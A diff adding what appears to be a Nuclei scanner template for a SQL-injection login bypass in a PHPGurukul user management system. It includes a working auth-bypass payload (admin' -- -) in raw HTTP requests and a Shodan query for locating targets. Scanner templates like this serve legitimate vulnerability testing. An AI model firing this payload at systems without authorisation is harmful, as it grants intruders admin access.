@@ -1,0 +1,46 @@
+id: user-management-system-sqli
+
+info:
+  name: User Management/Registration & Login v3.0 - SQL Injection
+  author: f0xy
+  severity: high
+  description: |
+    User Registration & Login and User Management System v3.0 admin panel has SQL vulnerability. Even though the person who discovered the vulnerability tested it in version 3.0, version 3.2 also contains the same vulnerability. It can be exploited by entering "admin' -- -" as the username parameter in the admin panel.
+  reference:
+    - https://www.exploit-db.com/exploits/51695
+    - https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: title:"Registration and Login System"
+  tags: sqli,auth-bypass,user-management
+
+http:
+  - raw:
+      - |
+        POST /admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin%27+--+-&password=whatever&login=
+
+      - |
+        GET /admin/dashboard.php HTTP/1.1
+        Host: {{Hostname}}
+
+    host-redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Admin Dashboard"
+          - "Manage Users"
+          - "Signout"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a00483046022100bc1d5effe5bde1f24beca0c441db912f123fe9b6c02ce9f7044820dbc894a41f0221009ebb0ae0179a9fab2d04d9e4f0b909283e868e4950fe9a3681a7e90ff6f202cc:922c64590222798bb761d5b6d8e72950
